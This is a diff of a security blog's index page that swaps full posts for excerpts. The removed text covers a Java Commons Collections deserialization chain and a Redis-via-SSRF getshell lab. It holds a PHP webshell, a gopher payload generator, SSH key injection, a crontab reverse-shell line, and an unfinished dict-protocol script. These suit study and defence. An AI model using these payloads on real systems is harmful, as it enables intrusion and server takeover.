@@ -155,6 +155,87 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/27/ysoserial-analyze-7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ananaskr">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ananaskr's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/04/27/ysoserial-analyze-7/" class="post-title-link" itemprop="url">ysoserial分析之CommonsCollections7</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-04-27 16:39:40" itemprop="dateCreated datePublished" datetime="2020-04-27T16:39:40+08:00">2020-04-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-04-30 09:39:46" itemprop="dateModified" datetime="2020-04-30T09:39:46+08:00">2020-04-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">JAVA安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>这篇文章分析的CommonsCollections7。这篇文章主要介绍了利用<font color=#008000>Hash碰撞</font>的方式来触发LazyMap.get函数，从而调用到transform函数，执行任意命令。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/04/27/ysoserial-analyze-7/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/27/ysoserial-analyze-6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -348,7 +429,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-30 09:13:48" itemprop="dateModified" datetime="2020-04-30T09:13:48+08:00">2020-04-30</time>
+                <time title="Modified: 2020-05-09 16:29:58" itemprop="dateModified" datetime="2020-05-09T16:29:58+08:00">2020-05-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -672,7 +753,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-05-08 22:31:03" itemprop="dateModified" datetime="2020-05-08T22:31:03+08:00">2020-05-08</time>
+                <time title="Modified: 2020-05-09 09:02:48" itemprop="dateModified" datetime="2020-05-09T09:02:48+08:00">2020-05-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -695,42 +776,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Apache-Commons-Collections介绍"><a href="#Apache-Commons-Collections介绍" class="headerlink" title="Apache Commons Collections介绍"></a>Apache Commons Collections介绍</h1><p>由于java序列化/反序列化的需求，开发过程中常使用一些公共库。Apache Commons Collections是一个扩展了java标准库里的Collection结构的第三方基础库。它为Java提供了很多基础常用且强大的数据结构，方便开发。</p>
-<p>而这个组件出现反序列化问题，主要是由于<code>TransformedMap</code>和<code>InvokerTransformer</code>造成的。</p>
-<h2 id="关键类介绍"><a href="#关键类介绍" class="headerlink" title="关键类介绍"></a>关键类介绍</h2><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p><code>TransformerdMap</code>这个类是用来对Map进行某些变换用的。当一个元素被<font color=ff0000><code>添加/删除/修改</code></font>过时，会自动调用<code>tranform</code>方法自动进行特定的修饰变换，变换的逻辑由Transformer类定义。</p>
-<p>通过decorate函数可以将一个普通的<code>Map</code>转换为一个<code>TransformedMap</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map transformedMap &#x3D; TransformedMap.decorate(map,keyTansformer,valueTransformer);</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>第二个参数和第三个参数分别对应于当Map中的key和value改变时需要做的操作。</p>
-</blockquote>
-<h3 id="Tranformer"><a href="#Tranformer" class="headerlink" title="Tranformer"></a>Tranformer</h3><p><code>Transformer</code>是一个接口，实现<code>transform(Object input)</code>方法即可进行实际的变换操作，上述代码若修改了其中的任意key或value，都会调用<code>tranform</code>方法进行变换操作。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">	new ConstantTransformer(...);</span><br><span class="line">	new InvokerTransformer(...)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Transformer chainedTransformer &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">Map transMap &#x3D; TransformedMap.decorate(rawMap,null,chainedTransformer);</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>若想进行一系列的变换操作，可以通过定义一个chainedTransformer来实现，只需要传入一个Transformer数组即可。</p>
-</blockquote>
-<p>ChainedTranformer的工作原理很简单，将上一个变换的结果作为下一次变换的输入，直到左右的变换完成，并返回最终的object。Commons Collections内置了许多常见的transformer，无需手工编写，其中InvokerTransformer可以通过调用Java反射机制来调用任意函数。</p>
-<h2 id="构造chainedTransformer"><a href="#构造chainedTransformer" class="headerlink" title="构造chainedTransformer"></a>构造chainedTransformer</h2><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><code>InvokerTransformer</code>相当于<code>Transformer</code>的一种。观察它的<code>tranform</code>函数，如下所示:</p>
-<p>org/apache/commons/collections/functors/InvokerTransformer.class<br><img src="1.png" alt=""></p>
-<p>从图上可知，关键部分在于通过<code>getClass()</code>、<code>getMethod()</code>以及<code>invoke()</code>来进行反射，查找并调用给定的方法。InvokerTransformer接受3个参数，分别是调用方法的名称，参数类型，调用参数。参数类型要对应于调用方法所指定的参数类型。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0]&#125;)</span><br></pre></td></tr></table></figure>
-
-<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>内置的<code>ConstantTranformer</code>类可以获取到特定的类。<br><img src="2.png" alt=""></p>
-<h3 id="构造链"><a href="#构造链" class="headerlink" title="构造链"></a>构造链</h3><p>在构造的chain中，最终的实现类似于</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((Runtime) Runtime.class.getMethod(&quot;getRuntime&quot;).invoke()).exec(&quot;ifconfig&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>因此第一步是获取到Runtime类，通过内置的<code>ConstantTransformer</code>来获取，然后通过<code>InvokerTransformer</code>来反射调用getMethod方法，参数是getRuntime，以此来获取到<code>Runtime.getRuntime</code>。以此类推，构造出调用invoke和exec的<code>InvokerTransformer</code>，整个chain就结束了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers &#x3D; new Transformer[] &#123;</span><br><span class="line">new ConstantTransformer(Runtime.class),</span><br><span class="line">new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[0]&#125;),</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;, new Object[] &#123;&quot;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Transformer transformChain &#x3D; new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
-
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>构造完这样的一个chain之后，只需要将一个<code>Map</code>类型的数据转换为<code>TransformedMap</code>，然后对其中的key,value进行操作，即可达到反序列化命令执行。可新建一个test.java进行测试。</p>
-<p>test.java</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformer &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">	Transformer transformedChain &#x3D; new ChainedTransformer(transformer);</span><br><span class="line"></span><br><span class="line">	Map&lt;String,String&gt; beforetransMap &#x3D; new HashMap&lt;String,String&gt;();</span><br><span class="line">	beforetransMap.put(&quot;name&quot;,&quot;ananaskr&quot;);</span><br><span class="line">        </span><br><span class="line">	Map transformedMap &#x3D; TransformedMap.decorate(beforetransMap,transformedChain,transformedChain);</span><br><span class="line"></span><br><span class="line">	Map.Entry onlyElement &#x3D; (Map.Entry) transformedMap.entrySet().iterator().next();</span><br><span class="line">    onlyElement.setValue(&quot;ananaskr1&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>结果如下:<br><img src="3.png" alt=""></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://www.freebuf.com/vuls/175252.html" target="_blank" rel="noopener">Apache-Commons-Collections反序列化漏洞分析</a></li>
-<li><a href="https://javasec.org/javase/JavaDeserialization/Collections.html" target="_blank" rel="noopener">Apache Commons Collections反序列化漏洞</a></li>
-</ul>
-
+          <p>由于java序列化/反序列化的需求，开发过程中常使用一些公共库。Apache Commons Collections是一个扩展了java标准库里的Collection结构的第三方基础库。它为Java提供了很多基础常用且强大的数据结构，方便开发。这个组件出现反序列化问题，由于很多类引起的。这里介绍其中一种方式的原理，与<font color=#008000><code>TransformedMap</code></font>和<font color=#008000><code>InvokerTransformer</code></font>有关。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/04/20/common-collections/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -780,7 +834,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-20 15:21:42" itemprop="dateModified" datetime="2020-04-20T15:21:42+08:00">2020-04-20</time>
+                <time title="Modified: 2020-05-09 08:58:55" itemprop="dateModified" datetime="2020-05-09T08:58:55+08:00">2020-05-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -803,115 +857,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>Redis是常见的内网服务，因其默认配置未授权访问或使用弱口令认证，可以导致getshell。经过总结，目前网上对于Redis常见的getshell方式有以下几种:  </p>
-<ul>
-<li><strong>绝对路径写Webshell</strong></li>
-<li><strong>写入ssh公钥</strong></li>
-<li><strong>写crontab计划任务反弹shell(针对CentOS)</strong></li>
-<li><strong>主从复制(4.0 &lt; Redis &lt; 5.0.5)</strong> </li>
-</ul>
-<p>这篇文章通过实验依次介绍几种方法的使用以及一些脚本，脚本以及此次实验的环境都放在了<a href="https://github.com/ananaskr/Escalation_Database/tree/master/Redis" target="_blank" rel="noopener">github</a>。</p>
-<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>首先介绍一下Redis以及此次实验的相关配置。</p>
-<h3 id="Redis介绍"><a href="#Redis介绍" class="headerlink" title="Redis介绍"></a>Redis介绍</h3><p>Redis常用命令有以下几个:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">info                    查看信息  </span><br><span class="line">flushall                删除数据库所有内容  </span><br><span class="line">flushdb                 刷新数据库  </span><br><span class="line">keys *                  查看所有键  </span><br><span class="line">set key value           设置变量  </span><br><span class="line">config set dir dirpath  设置路径  </span><br><span class="line">config set dbfilename   设置文件名  </span><br><span class="line">save                    保存</span><br></pre></td></tr></table></figure>
-
-<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><ul>
-<li>docker</li>
-<li>centos7.0 + Redis5.0</li>
-<li>Python3.6.0</li>
-</ul>
-<p>php代码放置在docker启动的web服务器上，是一个未经任何防御的SSRF的php代码。如下所示:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">		$link = $_GET[<span class="string">'url'</span>];</span><br><span class="line">		$curlobj = curl_init();</span><br><span class="line">		curl_setopt($curlobj, CURLOPT_POST,<span class="number">0</span>);</span><br><span class="line">		curl_setopt($curlobj, CURLOPT_URL,$link);</span><br><span class="line">		curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">		curl_setopt($curlobj, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">		$result=curl_exec($curlobj);</span><br><span class="line">		<span class="keyword">echo</span> $result;</span><br><span class="line">		curl_close($curlobj);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Redis在另一个镜像中，将Redis绑定在<code>0.0.0.0</code>，因此在宿主机访问<code>curl -v dict://127.0.0.1:6379/info</code>可以成功。但对于docker里的web服务器，<code>docker.for.mac.host.internal</code>为能访问宿主机的地址。即<code>docker.for.mac.host.internal:6379</code>来表示访问内网中的Redis。</p>
-<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>基于前面搭建的环境，对这几种利用方式进行了复现。</p>
-<h3 id="1-绝对路径写webshell"><a href="#1-绝对路径写webshell" class="headerlink" title="1. 绝对路径写webshell"></a>1. 绝对路径写webshell</h3><p>绝对路径写webshell的方法利用Redis的写权限向web目录中写入webshell，然后通过webshell来getshell。绝对路径写webshell的方法适用于以下场景:</p>
-<ol>
-<li>开启了web服务</li>
-<li>Redis具有对web路径的写权限</li>
-<li>知道web目录物理路径</li>
-</ol>
-<p>以写入php语言的webshell为例，需要在redis中执行以下命令以达到写入webshell的目的。  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;&lt;?php eval($_GET[&quot;cmd&quot;])&#39;;?&gt;&#39;</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-<p>在内网中最常用两种协议<code>dict://</code>与<code>gopher://</code>。其中<code>dict://</code>需要一步步地执行redis getshell的exp，而gopher协议只需要一个url请求即可。在这里使用gopher协议来进行利用。  </p>
-<p>Redis服务器与客户端通过RESP协议通信，在利用gopher协议时，需要将需要执行的命令转化为redis RESP协议的格式。这里参考了<a href="https://xz.aliyun.com/t/5665#toc-14" target="_blank" rel="noopener">网上的一个脚本</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp_resp.py</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">"gopher://"</span></span><br><span class="line">ip = <span class="string">"docker.for.mac.host.internal"</span></span><br><span class="line">port = <span class="string">"6379"</span></span><br><span class="line"></span><br><span class="line">shell = <span class="string">"\n\n&lt;?php system($_GET["</span>cmd<span class="string">"]);?&gt;\n\n"</span></span><br><span class="line">filename = <span class="string">"shell.php"</span></span><br><span class="line">path = <span class="string">"/var/www/html"</span></span><br><span class="line">passwd = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">cmd = [	<span class="string">"flushall"</span>,</span><br><span class="line">		<span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">		<span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">		<span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">		<span class="string">"save"</span></span><br><span class="line">		]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line"></span><br><span class="line">payload = protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">	CRLF = <span class="string">"\r\n"</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">	cmd = <span class="string">""</span></span><br><span class="line">	cmd += <span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd += CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">	cmd += CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += quote(redis_format(x))</span><br><span class="line">	print(payload)</span><br></pre></td></tr></table></figure>
-
-<p>运行的结果如下所示:</p>
-<p><img src="SSRF-Redis-1.png" alt=""></p>
-<p>此payload需放在浏览器中作为get请求的url的参数值，它需要进行一次url编码。即最后的payload为<code>http://127.0.0.1:7777/index.php?url=gopher.....</code></p>
-<p>在redis中可以看到执行成功。接下来访问<code>http://127.0.0.1/shell.php?cmd=command</code>即可。</p>
-<p><img src="SSRF-Redis-2.png" alt=""></p>
-<h3 id="2-写ssh公钥免密登录"><a href="#2-写ssh公钥免密登录" class="headerlink" title="2. 写ssh公钥免密登录"></a>2. 写ssh公钥免密登录</h3><p>写ssh公钥的方法利用的是ssh中提供可利用私钥登录的方式，将公钥写入特定目录下，导致攻击者可以私钥直接登录。写ssh公钥的方法适用于以下场景:</p>
-<ol>
-<li>开启了ssh服务，且允许免密登录</li>
-<li>需要root权限启动redis</li>
-</ol>
-<p>允许免密登录的配置在<code>etc/sshd/sshd_config</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"></span><br><span class="line">AuthorizedKeysFile	.ssh&#x2F;authorized_keys .ssh&#x2F;authorized_keys2</span><br></pre></td></tr></table></figure>
-
-<p>整个过程分为3步: 1) 生成key pair; 2) 写入ssh key; 3）登录。  </p>
-<h4 id="生成key-pair"><a href="#生成key-pair" class="headerlink" title="生成key pair"></a>生成key pair</h4><p>在本地生成公私钥对，进入<code>~/.ssh</code>，执行<code>ssh-keygen -t rsa</code>命令，输入生成的文件名<code>authorized_keys</code>。</p>
-<h4 id="写入ssh-key"><a href="#写入ssh-key" class="headerlink" title="写入ssh key"></a>写入ssh key</h4><p>写入ssh key的方式与写入webshell一样，只是改变了写入的目录以及写入的内容。redis运行在什么用户，就能直接以此用户身份进行登录。一般是些写入<code>/root/.ssh</code>目录，也可以写入用户目录，不过需要多一步猜测用户目录。若目录不存在，可利用crontab创建目录，这一方式在下面会介绍到。写入ssh key需要在redis中执行以下命令:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;ssh-rsa xxx...xxx&#39;</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-<p>同理，可用gopher可以完成此次利用。</p>
-<h3 id="0x03-写crontab计划反弹shell"><a href="#0x03-写crontab计划反弹shell" class="headerlink" title="0x03 写crontab计划反弹shell"></a>0x03 写crontab计划反弹shell</h3><p>写crontab计划的方式适用于以下场景:</p>
-<ol>
-<li>系统为Centos。</li>
-<li>root权限启动redis。</li>
-</ol>
-<blockquote>
-<p>此方法只能在CentOs上使用，Ubuntu上行不通主要有2点原因。1) 默认Redis写文件后是644的权限，但是Ubuntu要求执行定时任务<code>/var/spool/cron/ceontabs/&lt;username&gt;</code>的权限必须是600，才会执行，而CentOS的定时任务<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行。2) Redis保存RDB会存在乱码，在Ubuntu上会报错，而在CentOS上不会报错。</p>
-</blockquote>
-<p>执行的命令如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1\n\n&#39;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-<p>前面介绍了使用gopher协议生成payload，此方法也可以使用。但是这里介绍了使用<code>dict://</code>协议来进行利用。这里介绍另一个经典脚本，需要302.php以及shell.php放置在vps上。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="string">'6379'</span></span><br><span class="line"></span><br><span class="line">vul_httpurl = <span class="string">"http://127.0.0.1:7777/index.php?url="</span></span><br><span class="line"></span><br><span class="line">_location = <span class="string">"http://vps:7777/302.php"</span></span><br><span class="line"></span><br><span class="line">shell_location = <span class="string">"http://vps:7777/shell.php"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 flush db</span></span><br><span class="line">scheme = <span class="string">"dict"</span></span><br><span class="line">ip = <span class="string">"docker.for.mac.host.internal"</span></span><br><span class="line">port = <span class="number">6379</span></span><br><span class="line">bhost = <span class="string">"vps"</span></span><br><span class="line">bport = <span class="number">2333</span></span><br><span class="line">_payload = <span class="string">'?scheme=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=flushall'</span>.format(</span><br><span class="line">	scheme = scheme,</span><br><span class="line">	ip = 